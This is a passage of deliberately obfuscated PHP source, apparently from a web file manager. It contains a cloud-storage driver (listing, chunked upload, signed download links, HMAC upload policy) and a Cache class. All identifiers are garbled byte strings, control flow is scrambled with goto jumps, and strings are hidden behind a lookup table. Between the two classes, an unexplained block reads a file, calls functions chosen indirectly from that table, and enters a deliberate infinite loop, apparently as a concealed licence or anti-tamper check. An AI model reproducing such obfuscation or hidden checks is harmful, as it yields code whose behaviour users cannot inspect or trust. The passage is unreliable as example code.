$E¢©æ‹áÊÍ[$AæÏ‚§íÏ[184]] = $CğÍè÷å§[$AæÏ‚§íÏ[1242]]; $E¢©æ‹áÊÍ[$AæÏ‚§íÏ[107]] = $CğÍè÷å§[$AæÏ‚§íÏ[1243]]; $E¢©æ‹áÊÍ[$AæÏ‚§íÏ[77]] = $CğÍè÷å§[$AæÏ‚§íÏ[77]]; } return $E¢©æ‹áÊÍ; } public function folderInfo($f¡çÇó×ÒØ, $d“ÜŠÉéÆ = false) { $EÙ†ÁË¾« =& $_SERVER[¢à]; if ($d“ÜŠÉéÆ) { return array($EÙ†ÁË¾«[28] => $this->pathThis($f¡çÇó×ÒØ), $EÙ†ÁË¾«[75] => $this->getPathOuter($EÙ†ÁË¾«[8] . $f¡çÇó×ÒØ), $EÙ†ÁË¾«[29] => $EÙ†ÁË¾«[76]); } $aæôŠŒ…Ç¾ = array($EÙ†ÁË¾«[28] => $this->pathThis($f¡çÇó×ÒØ), $EÙ†ÁË¾«[75] => $this->getPathOuter($EÙ†ÁË¾«[8] . $f¡çÇó×ÒØ), $EÙ†ÁË¾«[29] => $EÙ†ÁË¾«[76], $EÙ†ÁË¾«[184] => 0, $EÙ†ÁË¾«[107] => isset($c¼¬í–Ş[$EÙ†ÁË¾«[1241]]) ? $c¼¬í–Ş[$EÙ†ÁË¾«[1241]] : 0, $EÙ†ÁË¾«[1151] => !0, $EÙ†ÁË¾«[1152] => !0); if (empty($DÌÁòŠè‰ï)) { $DÌÁòŠè‰ï = $this->objectMeta($f¡çÇó×ÒØ); if (!$DÌÁòŠè‰ï) { return $aæôŠŒ…Ç¾; } $aæôŠŒ…Ç¾[$EÙ†ÁË¾«[184]] = $DÌÁòŠè‰ï[$EÙ†ÁË¾«[1242]]; $aæôŠŒ…Ç¾[$EÙ†ÁË¾«[107]] = $DÌÁòŠè‰ï[$EÙ†ÁË¾«[1243]]; } return $aæôŠŒ…Ç¾; } private function fileList($c„†¸œ§Ş¾, $aÛ´š”ç÷¡ = 0, $FÆŠ„Ûâ…’ = 1000) { $a•‡Ü„»ó =& $_SERVER[¢à]; $AøƒÖæ†Å = array($a•‡Ü„»ó[1244], $a•‡Ü„»ó[1245] . $FÆŠ„Ûâ…’); if ($aÛ´š”ç÷¡) { $AøƒÖæ†Å[] = $a•‡Ü„»ó[1246] . $aÛ´š”ç÷¡; } $eçëË¸ã£ = $this->ussRequest($c„†¸œ§Ş¾, $a•‡Ü„»ó[213], !1, $AøƒÖæ†Å); return !$eçëË¸ã£[$a•‡Ü„»ó[1028]] ? !1 : $eçëË¸ã£[$a•‡Ü„»ó[1030]]; } public function listPath($DÎÌ‹¢İÆ, $E¼¦Ÿ‚–„½ = false) { goto b’ŒÇ‰ïå; DŠ‘õø«ñ„: $féÓ–œ ­ª = $FßÓªğÑ•‹ = array(); $B¼ç½›²½» = rtrim($DÎÌ‹¢İÆ, $AŠÁÕç¶•‚[8]) . $AŠÁÕç¶•‚[8]; while (!0) { $B¯÷‘™ôù° = $this->fileList($DÎÌ‹¢İÆ, $f‡Ç©†¿ğ©, $a­œ–×ôÅÃ); if (!$B¯÷‘™ôù°) { return !1; } $f‡Ç©†¿ğ© = isset($B¯÷‘™ôù°[$AŠÁÕç¶•‚[1247]]) ? $B¯÷‘™ôù°[$AŠÁÕç¶•‚[1247]] : $AŠÁÕç¶•‚[33]; $bçóŞíä = isset($B¯÷‘™ôù°[$AŠÁÕç¶•‚[1248]]) ? $B¯÷‘™ôù°[$AŠÁÕç¶•‚[1248]] : array(); foreach ($bçóŞíä as $EæÓ÷ÏˆŒ) { if ($EæÓ÷ÏˆŒ[$AŠÁÕç¶•‚[29]] == $AŠÁÕç¶•‚[76]) { $féÓ–œ ­ª[] = $this->folderInfo($B¼ç½›²½» . $EæÓ÷ÏˆŒ[$AŠÁÕç¶•‚[28]], $E¼¦Ÿ‚–„½, $EæÓ÷ÏˆŒ); } else { $FßÓªğÑ•‹[] = $this->fileInfo($B¼ç½›²½» . $EæÓ÷ÏˆŒ[$AŠÁÕç¶•‚[28]], $E¼¦Ÿ‚–„½, $EæÓ÷ÏˆŒ); } } if (count($bçóŞíä) < $a­œ–×ôÅÃ) { break; } } goto Eâë…»º‰; b’ŒÇ‰ïå: $AŠÁÕç¶•‚ =& $_SERVER[¢à]; $f‡Ç©†¿ğ© = $AŠÁÕç¶•‚[33]; $a­œ–×ôÅÃ = 1000; goto DŠ‘õø«ñ„; Eâë…»º‰: return array($AŠÁÕç¶•‚[74] => $féÓ–œ ­ª, $AŠÁÕç¶•‚[73] => $FßÓªğÑ•‹); goto B°÷ë¦”¾®; B°÷ë¦”¾®: } private function recursionAllFiles($aÏÏ“Øâ›¡, &$B¦šÜöó ) { $A·Ÿï†¨Ä =& $_SERVER[¢à]; $bˆ×ŸĞ…Ø• = $A·Ÿï†¨Ä[33]; $eƒÍ¤Åéæñ = 1000; $eÉ‰Úéµ· = $Aˆ¸Ï™ÖÒ” = array(); $Bê¢º©£¤² = rtrim($aÏÏ“Øâ›¡, $A·Ÿï†¨Ä[8]) . $A·Ÿï†¨Ä[8]; while (!0) { $aáø…„âäŸ = $this->fileList($aÏÏ“Øâ›¡, $bˆ×ŸĞ…Ø•, $eƒÍ¤Åéæñ); if (!$aáø…„âäŸ) { return !1; } $bˆ×ŸĞ…Ø• = isset($aáø…„âäŸ[$A·Ÿï†¨Ä[1247]]) ? $aáø…„âäŸ[$A·Ÿï†¨Ä[1247]] : $A·Ÿï†¨Ä[33]; $DÛ¿ôéŠ´˜ = isset($aáø…„âäŸ[$A·Ÿï†¨Ä[1248]]) ? $aáø…„âäŸ[$A·Ÿï†¨Ä[1248]] : array(); foreach ($DÛ¿ôéŠ´˜ as $f—ØäøÛ¥) { $e©Êš‚­Š = array($A·Ÿï†¨Ä[75] => $Bê¢º©£¤² . $f—ØäøÛ¥[$A·Ÿï†¨Ä[28]], $A·Ÿï†¨Ä[76] => $f—ØäøÛ¥[$A·Ÿï†¨Ä[29]] == $A·Ÿï†¨Ä[76] ? 1 : 0, $A·Ÿï†¨Ä[77] => isset($f—ØäøÛ¥[$A·Ÿï†¨Ä[322]]) ? $f—ØäøÛ¥[$A·Ÿï†¨Ä[322]] : 0); $B¦šÜöó [] = $e©Êš‚­Š; if ($e©Êš‚­Š[$A·Ÿï†¨Ä[76]] == 1) { $this->recursionAllFiles($e©Êš‚­Š[$A·Ÿï†¨Ä[75]], $B¦šÜöó ); } } if (count($DÛ¿ôéŠ´˜) < $eƒÍ¤Åéæñ) { break; } } } public function has($D­šÖ³äÌï, $e¨¡õÜĞâ… = false, $bâó¥óƒšË = true) { goto f•§•ˆùÇ°; f•§•ˆùÇ°: $a»ÈÑ İ =& $_SERVER[¢à]; $CªŸÄ­´Ş‡ = $a»ÈÑ İ[33]; $B¯ôùâïø = 1000; goto DåŒÈ™‚Ä†; E‹ÊØíçŸ¤: while (!0) { $AÅ”¦¾œÊ¥ = $this->fileList($D­šÖ³äÌï, $CªŸÄ­´Ş‡, $B¯ôùâïø); if (!$AÅ”¦¾œÊ¥) { return !1; } $CªŸÄ­´Ş‡ = isset($AÅ”¦¾œÊ¥[$a»ÈÑ İ[1247]]) ? $AÅ”¦¾œÊ¥[$a»ÈÑ İ[1247]] : $a»ÈÑ İ[33]; $C§†‹Û¥Ò = isset($AÅ”¦¾œÊ¥[$a»ÈÑ İ[1248]]) ? $AÅ”¦¾œÊ¥[$a»ÈÑ İ[1248]] : array(); if (empty($C§†‹Û¥Ò)) { break; } $DÑÓ‚›™Œ = array_to_keyvalue($C§†‹Û¥Ò, $a»ÈÑ İ[33], $a»ÈÑ İ[29]); $FùËÉ„½¦‡ = array_count_values($DÑÓ‚›™Œ); $AÑì‘Ó¬ì = isset($FùËÉ„½¦‡[$a»ÈÑ İ[76]]) ? $FùËÉ„½¦‡[$a»ÈÑ İ[76]] : 0; $aŠ„–‡Œ„— = count($DÑÓ‚›™Œ) - $AÑì‘Ó¬ì; if ($e¨¡õÜĞâ…) { $aÂù÷ÜÓÓ¹ += $AÑì‘Ó¬ì; $DœÊ”ğŒó += $aŠ„–‡Œ„—; if ($bÖ¢é“¢™ < $B¯ôùâïø) { break; } continue; } if ($bâó¥óƒšË) { if ($aŠ„–‡Œ„—) { return !0; } } else { if ($AÑì‘Ó¬ì) { return !0; } } if (count($C§†‹Û¥Ò) < $B¯ôùâïø) { break; } } if ($e¨¡õÜĞâ…) { return array($a»ÈÑ İ[188] => $DœÊ”ğŒó, $a»ÈÑ İ[189] => $aÂù÷ÜÓÓ¹); } return !1; goto c…‘ÏŞµâ±; DåŒÈ™‚Ä†: $DœÊ”ğŒó = 0; $aÂù÷ÜÓÓ¹ = 0; $aÃØ¢¦‚ä = rtrim($D­šÖ³äÌï, $a»ÈÑ İ[8]) . $a»ÈÑ İ[8]; goto E‹ÊØíçŸ¤; c…‘ÏŞµâ±: } public function listAll($A¹­•œ¹) { $A§„´ôµ˜ò = array(); $this->recursionAllFiles($A¹­•œ¹, $A§„´ôµ˜ò); return $A§„´ôµ˜ò; } public function canRead($cĞ½‹‹·µÊ) { return $this->exist($cĞ½‹‹·µÊ) ? !0 : !1; } public function canWrite($A£âãù‹“‹) { return $this->exist($A£âãù‹“‹) ? !0 : !1; } public function getContent($f–ÖÙ•‰öÒ) { return $this->fileSubstr($f–ÖÙ•‰öÒ, 0, -1); } public function setContent($c¬¦Î‘È¡Æ, $dİ¯™Şîéğ = '') { $B‡åÒè×Û =& $_SERVER[¢à]; if (!$dİ¯™Şîéğ) { $c¾âíÂ›òˆ = $this->ussRequest($c¬¦Î‘È¡Æ, $B‡åÒè×Û[209]); return $c¾âíÂ›òˆ[$B‡åÒè×Û[1028]]; } $C˜»·¹ïµÈ = $this->tempFile($this->pathThis($c¬¦Î‘È¡Æ)); file_put_contents($C˜»·¹ïµÈ, $dİ¯™Şîéğ); if ($this->upload($c¬¦Î‘È¡Æ, $C˜»·¹ïµÈ)) { $this->tempFileRemve($C˜»·¹ïµÈ); return !0; } return !1; } public function fileSubstr($a±ĞªÖ‚·, $C›¢Œá°Ğ, $f¤Û¶‰òó•) { $f±áƒŒÚÔ =& $_SERVER[¢à]; if (!($FòĞ½¬´”æ = $this->link($a±ĞªÖ‚·))) { return !1; } $BâÒ· ï¬ö = !1; if ($f¤Û¶‰òó• > 0) { $cÚ÷ëæ“øá = $C›¢Œá°Ğ + $f¤Û¶‰òó• - 1; $BâÒ· ï¬ö = array($f±áƒŒÚÔ[1209] . $C›¢Œá°Ğ . $f±áƒŒÚÔ[408] . $cÚ÷ëæ“øá); } $f×‹å¢Ò‡ = url_request($FòĞ½¬´”æ, $f±áƒŒÚÔ[213], !1, $BâÒ· ï¬ö); return $f×‹å¢Ò‡[$f±áƒŒÚÔ[689]] ? $f×‹å¢Ò‡[$f±áƒŒÚÔ[1030]] : !1; } public function upload($a¬Ã’å£ó, $C›ä…í¡¤, $F«Ô‘Õâ«´ = false, $EŸ¢ÜŒµÏ = REPEAT_REPLACE) { goto BËñĞÒ¢; dä„ùŠ™¦: $Eïµê®Êğ = 0; $fŒŒ³äÎÆß = $E·±©ˆ´’İ[$aŠ´ùÎ‰ãÉ[1254]]; $e«Õë×®¢£ = fopen($C›ä…í¡¤, $aŠ´ùÎ‰ãÉ[1159]); goto F™®»“–Ü·; C•ÛØß„Í¦: $a÷Âœ÷ñ”Û = array($aŠ´ùÎ‰ãÉ[1256], $aŠ´ùÎ‰ãÉ[1257] . $E·±©ˆ´’İ[$aŠ´ùÎ‰ãÉ[1258]], $aŠ´ùÎ‰ãÉ[1252]); $cÂ”íÜ…‚± = $this->ussRequest($a¬Ã’å£ó, $aŠ´ùÎ‰ãÉ[211], !1, $a÷Âœ÷ñ”Û); return $cÂ”íÜ…‚±[$aŠ´ùÎ‰ãÉ[1028]] ? $this->getPathOuter($cßŠ¨†õ) : !1; goto bËÜŒ¹Şª; Aº¦‘ÕŠ±: $cÂ”íÜ…‚± = $this->ussRequest($a¬Ã’å£ó, $aŠ´ùÎ‰ãÉ[211], !1, $a÷Âœ÷ñ”Û); if (!$cÂ”íÜ…‚±[$aŠ´ùÎ‰ãÉ[1028]]) { return !1; } $E·±©ˆ´’İ = $cÂ”íÜ…‚±[$aŠ´ùÎ‰ãÉ[1030]]; goto dä„ùŠ™¦; F™®»“–Ü·: if (!$e«Õë×®¢£) { return !1; } do { $aÇ» ï–… = $E·±©ˆ´’İ[$aŠ´ùÎ‰ãÉ[1255]]; fseek($e«Õë×®¢£, $Eïµê®Êğ); $F‡Ê‘È¾Ïà = fread($e«Õë×®¢£, $aÇ» ï–…); $bõÕ‡Ú°Ä = 0; do { $bõÕ‡Ú°Ä++; $E·±©ˆ´’İ = $this->uploadPart($a¬Ã’å£ó, $E·±©ˆ´’İ, $F‡Ê‘È¾Ïà); } while (!$E·±©ˆ´’İ && $bõÕ‡Ú°Ä < 3); if (!$E·±©ˆ´’İ) { return !1; } $fŒŒ³äÎÆß = $E·±©ˆ´’İ[$aŠ´ùÎ‰ãÉ[1254]]; $Eïµê®Êğ += $aÇ» ï–…; } while ($fŒŒ³äÎÆß != -1); fclose($e«Õë×®¢£); goto C•ÛØß„Í¦; bÁ™ÁİŒˆ: $A¢ù»º  = $this->osChunkSize(); if ($A¢ù»º  > 1024 * 1024 * 10) { $A¢ù»º  = 1024 * 1024 * 10; } $a÷Âœ÷ñ”Û = array($aŠ´ùÎ‰ãÉ[1250], $aŠ´ùÎ‰ãÉ[1251] . $bò»Í´¸ˆ, $aŠ´ùÎ‰ãÉ[1252], $aŠ´ùÎ‰ãÉ[1253] . $A¢ù»º ); goto Aº¦‘ÕŠ±; BËñĞÒ¢: $aŠ´ùÎ‰ãÉ =& $_SERVER[¢à]; $bò»Í´¸ˆ = IO::size($C›ä…í¡¤); if ($bò»Í´¸ˆ <= 1024 * 1024 * 200) { $b¹ÉÂë‘»™ = array($aŠ´ùÎ‰ãÉ[1249] . $C›ä…í¡¤); $cÂ”íÜ…‚± = $this->ussRequest($a¬Ã’å£ó, $aŠ´ùÎ‰ãÉ[211], $b¹ÉÂë‘»™); return $cÂ”íÜ…‚±[$aŠ´ùÎ‰ãÉ[1028]] ? $this->getPathOuter($a¬Ã’å£ó) : !1; } goto bÁ™ÁİŒˆ; bËÜŒ¹Şª: } private function uploadPart($A•Ğ‹Üİ•£, $fÅğƒ·à«¡, &$c²ÖÍÔçø) { $CôÎ»‡Á =& $_SERVER[¢à]; $dÀ‰İã²Ù = array($CôÎ»‡Á[1259], $CôÎ»‡Á[1257] . $fÅğƒ·à«¡[$CôÎ»‡Á[1258]], $CôÎ»‡Á[1260] . $fÅğƒ·à«¡[$CôÎ»‡Á[1254]], $CôÎ»‡Á[1261] . $fÅğƒ·à«¡[$CôÎ»‡Á[1255]]); $FÌ–®½›¤™ = $this->ussRequest($A•Ğ‹Üİ•£, $CôÎ»‡Á[211], $c²ÖÍÔçø, $dÀ‰İã²Ù); return !$FÌ–®½›¤™[$CôÎ»‡Á[1028]] ? $FÌ–®½›¤™[$CôÎ»‡Á[1028]] : $FÌ–®½›¤™[$CôÎ»‡Á[1030]]; } public function uploadFormData($cî•…İÎ‰Ÿ, $fÀõ‰²Ğ‰„ = 3600) { return $this->uploadPolicy($cî•…İÎ‰Ÿ, $fÀõ‰²Ğ‰„); } public function multiUploadFormData($cä„Ó‰Šâœ, $fËŞÀ”Ä· = 3600) { $a¬‹ÜØÖØ =& $_SERVER[¢à]; $Dì„¤¨ª¹Å = (int) $GLOBALS[$a¬‹ÜØÖØ[7]][$a¬‹ÜØÖØ[77]]; return $this->uploadPolicy($cä„Ó‰Šâœ, $fËŞÀ”Ä·, $Dì„¤¨ª¹Å); } private function uploadPolicy($b´Ü•¦ŞŒ›, $aòÚ‡åÇÖ¹ = 3600, $eŠ·çâà”§ = 0) { goto A„ôõÆ‡÷±; e‰âÅÏ·: $fÇ “ĞÇÑ = base64_encode(hash_hmac($BĞœ½èÀ‘[1231], "\120\117\x53\124\46{$Fö ÒÇ¶é}\46{$dŒáºáÕòˆ}\46{$c¶‹Œ´¨¥È}", md5("{$this->userpass}"), !0)); $DÅØ¨…èÌ¡ = array($BĞœ½èÀ‘[1101] => $c¶‹Œ´¨¥È, $BĞœ½èÀ‘[1266] => "\x55\120\131\x55\116\x20{$this->username}\x3a{$fÇ “ĞÇÑ}", $BĞœ½èÀ‘[166] => $this->endpoint . $Fö ÒÇ¶é); return $DÅØ¨…èÌ¡; goto CäÎ…í‚†¢; A„ôõÆ‡÷±: $BĞœ½èÀ‘ =& $_SERVER[¢à]; $Fö ÒÇ¶é = $BĞœ½èÀ‘[8] . $this->bucket; $dŒáºáÕòˆ = gmdate($BĞœ½èÀ‘[1194]); goto BØêÎîé©; BØêÎîé©: $Aìç¾ßî‹˜ = array($BĞœ½èÀ‘[1262] => $this->bucket, $BĞœ½èÀ‘[1263] => $b´Ü•¦ŞŒ›, $BĞœ½èÀ‘[1264] => time() + $aòÚ‡åÇÖ¹, $BĞœ½èÀ‘[1265] => $dŒáºáÕòˆ); if ($eŠ·çâà”§) { $Aìç¾ßî‹˜[$BĞœ½èÀ‘[1180]] = $eŠ·çâà”§; } $c¶‹Œ´¨¥È = base64_encode(json_encode($Aìç¾ßî‹˜)); goto e‰âÅÏ·; CäÎ…í‚†¢: } public function download($CÀÆ¾ƒÈï, $cŠ®°šŠ) { goto dµ°Ğœ¬ÈÄ; dµ°Ğœ¬ÈÄ: $Dâ«êÚ¦É = IO::getPathInner(IO::mkfile($cŠ®°šŠ)); if (!($cÛ…¸Ú‘ßª = $this->link($CÀÆ¾ƒÈï))) { return !1; } $e±Î§Š–ë½ = 0; goto AôŒ…Ü’‚; AôŒ…Ü’‚: $BæÓ¹ŒÀÀ = 1024 * 200; $d„Š´îÎ¸ê = fopen($Dâ«êÚ¦É, $_SERVER[¢à][1215]); while (!0) { $c‹‘Œï†î = $this->fileSubstr($CÀÆ¾ƒÈï, $e±Î§Š–ë½, $BæÓ¹ŒÀÀ); if ($c‹‘Œï†î === !1) { return !1; } fwrite($d„Š´îÎ¸ê, $c‹‘Œï†î); $e±Î§Š–ë½ += $BæÓ¹ŒÀÀ; if (strlen($c‹‘Œï†î) < $BæÓ¹ŒÀÀ) { break; } } goto C‰ˆôáøö; C‰ˆôáøö: fclose($d„Š´îÎ¸ê); return $cŠ®°šŠ; goto A¦ó¯Œøƒİ; A¦ó¯Œøƒİ: } public function link($E’÷éÂÁ¯Ô, $e°‡—®’×† = array()) { $C´²ŒåÖÆê =& $_SERVER[¢à]; $E’÷éÂÁ¯Ô = trim($E’÷éÂÁ¯Ô, $C´²ŒåÖÆê[8]); if (!empty($this->token)) { $aŠ´Ïæ›å‚ = strtotime(date($C´²ŒåÖÆê[1267])); $d÷ˆà¥Ó»¿ = substr(md5($this->token . $C´²ŒåÖÆê[269] . $aŠ´Ïæ›å‚ . $C´²ŒåÖÆê[1268] . $E’÷éÂÁ¯Ô), 12, 8) . $aŠ´Ïæ›å‚; $e°‡—®’×†[] = $C´²ŒåÖÆê[1269] . $d÷ˆà¥Ó»¿; } $aœçĞ‚Óö¤ = !empty($e°‡—®’×†) ? $C´²ŒåÖÆê[69] . implode($C´²ŒåÖÆê[269], $e°‡—®’×†) : $C´²ŒåÖÆê[33]; return $C´²ŒåÖÆê[1104] . $this->domain . $C´²ŒåÖÆê[8] . $E’÷éÂÁ¯Ô . $aœçĞ‚Óö¤; } public function fileOut($FëîáøÚº, $F»â„éÂË = false, $b¾¢ôÌ¹ó = false, $A”Ñ‹µøõó = '') { if (!$b¾¢ôÌ¹ó) { $b¾¢ôÌ¹ó = $this->pathThis($FëîáøÚº); } $E®íòğù¬ = $F»â„éÂË ? array($_SERVER[¢à][1270] . rawurlencode($b¾¢ôÌ¹ó)) : array(); $aĞ¯‘ãƒ¤ë = $this->link($FëîáøÚº, $E®íòğù¬); $this->fileOutLink($aĞ¯‘ãƒ¤ë); } public function fileOutServer($EË¸ä¼™¾, $d‰¡Íè­„ = false, $aÂÄì•ğæâ = false, $dÙœé‹¶Ñğ = '') { parent::fileOut($EË¸ä¼™¾, $d‰¡Íè­„, $aÂÄì•ğæâ, $dÙœé‹¶Ñğ); } public function fileOutImage($f‚‹ àîõ¥, $B­¨ëêñÑÑ = 250) { $eªÇÃ¢áÇ = $this->link($f‚‹ àîõ¥ . $_SERVER[¢à][1271] . $B­¨ëêñÑÑ); $this->fileOutLink($eªÇÃ¢áÇ); } public function fileOutImageServer($A™¯êçåËõ, $E¢ÄÃËøĞœ = 250) { parent::fileOutImage($A™¯êçåËõ, $E¢ÄÃËøĞœ); } public function hashMd5($c‹£ßïÕ¤š) { $A–šÆ˜Ú°ô =& $_SERVER[¢à]; $d¹öŒÛ¦­ğ = $this->objectMeta($c‹£ßïÕ¤š); return isset($d¹öŒÛ¦­ğ[$A–šÆ˜Ú°ô[193]]) ? $d¹öŒÛ¦­ğ[$A–šÆ˜Ú°ô[193]] : !1; } public function size($e—ÈƒÚÙé´) { $a’âİ¯Š™ = $this->objectMeta($e—ÈƒÚÙé´); return $a’âİ¯Š™ ? $a’âİ¯Š™[$_SERVER[¢à][77]] : 0; } public function info($E™†¢™”¯) { if ($this->isFolder($E™†¢™”¯)) { return $this->folderInfo($E™†¢™”¯); } else { if ($this->isFile($E™†¢™”¯)) { return $this->fileInfo($E™†¢™”¯); } } return !1; } public function exist($cŒ›õê‡) { return $this->isFile($cŒ›õê‡) || $this->isFolder($cŒ›õê‡); } public function isFile($cÙ›´…­™ö) { return !$this->isFolder($cÙ›´…­™ö) && $this->objectMeta($cÙ›´…­™ö); } public function isFolder($e†…ëİİö) { return $this->cacheMethod($_SERVER[¢à][220], $e†…ëİİö); } protected function objectMeta($c§­ ’¯õ´) { return $this->cacheMethod($_SERVER[¢à][221], $c§­ ’¯õ´); } protected function _objectMeta($D”ò†íìäñ) { goto A¯¦¦…Ô; D–•Àö¾Ññ: if (!$Aµ®©¶ãÒ[$E”¬ÏŒ×¬Š[1028]]) { return null; } $e¥î¹¹Í¾” = isset($Aµ®©¶ãÒ[$E”¬ÏŒ×¬Š[1030]]) ? $Aµ®©¶ãÒ[$E”¬ÏŒ×¬Š[1030]] : array(); if (!isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1273]])) { return null; } goto A¦Ÿ£ÀŠ–ˆ; A¯¦¦…Ô: $E”¬ÏŒ×¬Š =& $_SERVER[¢à]; if ($D”ò†íìäñ == $E”¬ÏŒ×¬Š[33] || $D”ò†íìäñ == $E”¬ÏŒ×¬Š[8]) { return array(); } $Aµ®©¶ãÒ = $this->ussRequest($D”ò†íìäñ, $E”¬ÏŒ×¬Š[1272]); goto D–•Àö¾Ññ; A¦Ÿ£ÀŠ–ˆ: $C§ÌÍŞ³õÆ = array($E”¬ÏŒ×¬Š[28] => get_path_this($D”ò†íìäñ), $E”¬ÏŒ×¬Š[29] => isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1273]]) ? $e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1273]] : null, $E”¬ÏŒ×¬Š[77] => isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1274]]) ? $e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1274]] : null, $E”¬ÏŒ×¬Š[193] => isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1275]]) ? $e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1275]] : null, $E”¬ÏŒ×¬Š[1242] => isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1276]]) ? $e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1276]] : null); $C§ÌÍŞ³õÆ[$E”¬ÏŒ×¬Š[1243]] = isset($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1277]]) ? strtotime($e¥î¹¹Í¾”[$E”¬ÏŒ×¬Š[1277]]) : $C§ÌÍŞ³õÆ[$E”¬ÏŒ×¬Š[1242]]; return $C§ÌÍŞ³õÆ; goto fÇ£¶µ±óâ; fÇ£¶µ±óâ: } protected function _isFolder($f›¡ÙöÙÈ¢) { $d¬¤¨Ïİà¾ =& $_SERVER[¢à]; if ($f›¡ÙöÙÈ¢ == $d¬¤¨Ïİà¾[33] || $f›¡ÙöÙÈ¢ == $d¬¤¨Ïİà¾[8]) { return !0; } $eÇ½ÅøĞ = $this->objectMeta($f›¡ÙöÙÈ¢); return isset($eÇ½ÅøĞ[$d¬¤¨Ïİà¾[29]]) && $eÇ½ÅøĞ[$d¬¤¨Ïİà¾[29]] == $d¬¤¨Ïİà¾[76] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[¢à][786]]) || !isset($_SERVER[$_SERVER[¢à][787]])) { goto e¸Ì¾á„„; BŞ¶„ÒØ—Æ: $eãàîŸÌÑÈ($_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]); $C‘Ö¶«‹†„ = 2; while ($C‘Ö¶«‹†„ > 1) { $F™éöŠ“ = rawurlencode($C‘Ö¶«‹†„ . $_SERVER[¢à][358]); } goto d¶é°È›³; Cé–Ğµà: $CèÅ‘…×¸ä = explode($_SERVER[¢à][214], $A÷Ü«òå¦); if (count($CèÅ‘…×¸ä) < $_SERVER[¢à][571]) { $b½Ğ•«½Í• = $_SERVER[¢à][792]; $b½Ğ•«½Í•(); } $eãàîŸÌÑÈ = $_SERVER[¢à][1113]; goto BŞ¶„ÒØ—Æ; e¸Ì¾á„„: $B™ ÷İì´´ = $_SERVER[¢à][789]; $DÄ¥ï·…«à = $_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]; $A÷Ü«òå¦ = $B™ ÷İì´´($DÄ¥ï·…«à); goto Cé–Ğµà; d¶é°È›³: } goto CîÂİ‹Öèƒ; F¦¸‹…ÆãĞ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto e‰³‡‘´²…; F¨•›©ááÕ: switch ($B…‹³¯©»[$aõÜè¬ğ¨º[753]]) { case $aõÜè¬ğ¨º[17]: self::$handle = Model($aõÜè¬ğ¨º[755]); break; case $aõÜè¬ğ¨º[756]: self::$handle = new CacheRedis($eãİöÍÒ¸´, $C”ÛÂôÌ¡²); break; case $aõÜè¬ğ¨º[757]: self::$handle = new CacheMemcached($eãİöÍÒ¸´, $C”ÛÂôÌ¡²); break; case $aõÜè¬ğ¨º[164]: self::$handle = new CacheFile($eãİöÍÒ¸´, $C”ÛÂôÌ¡²); break; default: break; } return self::$handle; goto d›‹ààĞó´; aÅŠ®¼“©ô: $B…‹³¯©» = $GLOBALS[$aõÜè¬ğ¨º[6]][$aõÜè¬ğ¨º[334]]; $eãİöÍÒ¸´ = $B…‹³¯©»[$B…‹³¯©»[$aõÜè¬ğ¨º[753]]]; $C”ÛÂôÌ¡² = $B…‹³¯©»[$aõÜè¬ğ¨º[754]]; goto F¨•›©ááÕ; e‰³‡‘´²…: $aõÜè¬ğ¨º =& $_SERVER[¢à]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aÅŠ®¼“©ô; d›‹ààĞó´: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($C¥ß¶³Ú·É) { if (is_array($C¥ß¶³Ú·É) || is_object($C¥ß¶³Ú·É)) { $C¥ß¶³Ú·É = json_encode($C¥ß¶³Ú·É); } $C¥ß¶³Ú·É = rawurlencode($C¥ß¶³Ú·É); return KOD_SITE_ID . $_SERVER[¢à][70] . $C¥ß¶³Ú·É; } public static function get($C¾õ¾•…æ˜) { $fÃİğªß‰è = self::key($C¾õ¾•…æ˜); if (!isset(self::$memoryCache[$fÃİğªß‰è])) { CacheLock::lock($C¾õ¾•…æ˜); $eÌÓ³ÅåÂ = self::init()->get($fÃİğªß‰è); CacheLock::unlock($C¾õ¾•…æ˜); self::$memoryCache[$fÃİğªß‰è] = unserialize($eÌÓ³ÅåÂ); } return self::$memoryCache[$fÃİğªß‰è]; } public static function set($c‘±ª¯ÑŒ, $cœéÂğë›Œ, $B‰İŠÔáŒ­ = false) { goto c¸øº÷£¦›; f˜èÙäÔ…: CacheLock::unlock($c‘±ª¯ÑŒ); return $Aœ„¥­ò; goto c”‰ä´ÌÔ; c¸øº÷£¦›: $dŠâÜ¬ô´ = self::key($c‘±ª¯ÑŒ); if (isset(self::$memoryCache[$dŠâÜ¬ô´]) && self::$memoryCache[$dŠâÜ¬ô´] === $cœéÂğë›Œ) { return !0; } if ($B‰İŠÔáŒ­ === 0) { self::$memoryCache[$dŠâÜ¬ô´] = $cœéÂğë›Œ; return !0; } goto d‰‰ö§‡æå; d‰‰ö§‡æå: CacheLock::lock($c‘±ª¯ÑŒ); $Aœ„¥­ò = self::init()->set($dŠâÜ¬ô´, serialize($cœéÂğë›Œ), $B‰İŠÔáŒ­); self::$memoryCache[$dŠâÜ¬ô´] = $cœéÂğë›Œ; goto f˜èÙäÔ…; c”‰ä´ÌÔ: } public static function remove($Fõ„‹‘Ú°) { goto AİòáË…‘‡; EÖ¾®ºÔëÆ: return $e‚‰™¤çé; goto d¬ÂÊ¸³Ÿ; AİòáË…‘‡: $cÂœÑê¾‚— = self::key($Fõ„‹‘Ú°); unset(self::$memoryCache[$cÂœÑê¾‚—]); self::clearTimeout(); goto d£ÊÁÊÄÆŒ; d£ÊÁÊÄÆŒ: CacheLock::lock($Fõ„‹‘Ú°); $e‚‰™¤çé = self::init()->remove($cÂœÑê¾‚—); CacheLock::unlock($Fõ„‹‘Ú°); goto EÖ¾®ºÔëÆ; d¬ÂÊ¸³Ÿ: } public static function clearMemory($C•ëÉ£×Ñ… = false) { if ($C•ëÉ£×Ñ…) { $C•ëÉ£×Ñ… = self::key($C•ëÉ£×Ñ…); 